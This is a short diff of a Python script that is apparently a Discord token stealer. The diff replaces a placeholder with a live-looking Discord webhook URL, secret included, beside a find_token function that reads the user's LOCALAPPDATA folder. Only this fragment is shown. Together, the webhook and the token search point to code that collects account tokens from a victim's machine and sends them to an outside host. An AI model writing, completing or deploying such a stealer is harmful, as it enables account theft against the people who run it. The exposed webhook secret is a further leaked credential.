@@ -3,7 +3,7 @@ import json
 import requests # type: ignore
 from re import findall
 
-WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1259418892296523796/2NJhAVbWOoJuHS2CkORnNT32w6RiZJIwMAy70-MjZpRFsfIZdUwZL_ngNmuXrQAHFRKq'
 
 def find_token():
     local = os.getenv('LOCALAPPDATA')
